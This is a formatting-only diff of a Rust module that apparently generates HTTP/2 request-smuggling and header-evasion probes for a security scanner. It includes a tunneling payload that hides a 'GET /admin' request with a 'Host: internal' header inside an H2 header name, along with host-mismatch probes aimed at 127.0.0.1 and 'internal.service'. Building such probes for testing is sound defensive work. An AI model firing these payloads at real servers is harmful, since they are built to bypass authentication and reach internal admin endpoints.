@@ -252,8 +252,8 @@ pub fn authority_host_mismatch(
 /// sanitization. Previously invalid inputs silently produced empty-host
 /// probes.
 pub fn double_host(primary: &str, secondary: &str) -> Result<H2Evasion, H2EvasionError> {
-    let primary = sanitize_input(primary)
-        .map_err(|_| H2EvasionError::InvalidHost(primary.to_string()))?;
+    let primary =
+        sanitize_input(primary).map_err(|_| H2EvasionError::InvalidHost(primary.to_string()))?;
     let secondary = sanitize_input(secondary)
         .map_err(|_| H2EvasionError::InvalidHost(secondary.to_string()))?;
     Ok(H2Evasion {
@@ -428,14 +428,11 @@ pub fn h2_request_tunnel_colon_header_name(_inner_path: &str, _inner_host: &str)
     // tuning happens at the wire encoder.
     H2Evasion {
         name: "H2 Request Tunneling (colon-in-header-name)",
-        description:
-            "Embed HTTP/1.1 request line+headers as an H2 header NAME with colons — outer envelope gets injected auth headers, inner tunneled request does not",
-        headers: vec![
-            (
-                "GET /admin HTTP/1.1\r\nHost: internal\r\nX-Smuggled: true".into(),
-                "v".into(),
-            ),
-        ],
+        description: "Embed HTTP/1.1 request line+headers as an H2 header NAME with colons — outer envelope gets injected auth headers, inner tunneled request does not",
+        headers: vec![(
+            "GET /admin HTTP/1.1\r\nHost: internal\r\nX-Smuggled: true".into(),
+            "v".into(),
+        )],
         ..evasion(
             "H2 Request Tunneling (colon-in-header-name)",
             "Tunnel request via colon-header-name",
@@ -905,9 +902,7 @@ pub fn all_evasions(path: &str, host: &str) -> Result<Vec<H2Evasion>, SafetyErro
     evasions.push(
         authority_host_mismatch(host, "127.0.0.1").map_err(|_| SafetyError::HeaderInjection)?,
     );
-    evasions.push(
-        double_host(host, "internal.service").map_err(|_| SafetyError::HeaderInjection)?,
-    );
+    evasions.push(double_host(host, "internal.service").map_err(|_| SafetyError::HeaderInjection)?);
     evasions.extend([
         method_override(path, host, "POST"),
         method_override(path, host, "PUT"),
